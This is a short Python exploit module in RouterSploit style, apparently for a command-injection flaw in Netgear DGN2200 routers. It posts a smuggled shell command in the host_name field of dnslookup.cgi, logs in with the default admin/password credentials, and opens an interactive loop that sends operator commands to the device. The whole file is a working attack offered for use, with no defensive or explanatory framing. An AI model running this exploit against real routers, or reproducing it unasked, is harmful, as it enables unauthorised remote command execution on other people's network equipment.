# rsf exploit module
# title: Netgear DGN2200 RCE (dnslookup.cgi)
# description: Exploits Netgear DGN2200 RCE vulnerability through dnslookup.cgi resource.
# author: ediop3

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.username = "admin"
        self.password = "password"
        self.session = requests.Session()

    def run(self):
        print("[*] It is not possible to check if target is vulnerable")
        print("[*] Trying to invoke command loop...")
        print("[*] It is blind command injection. Response is not available.")
        self.shell()

    def execute(self, cmd):
        payload = "www.google.com; {}".format(cmd)
        data = {
            "host_name": payload,
            "lookup": "Lookup"
        }

        try:
            self.session.post(
                f"http://{self.target}:{self.port}/dnslookup.cgi",
                data=data,
                auth=(self.username, self.password),
                timeout=5
            )
        except:
            pass
        return ""

    def shell(self):
        while True:
            try:
                cmd = input("shell> ")
                if cmd.lower() in ["exit", "quit"]:
                    break
                self.execute(cmd)
            except KeyboardInterrupt:
                break
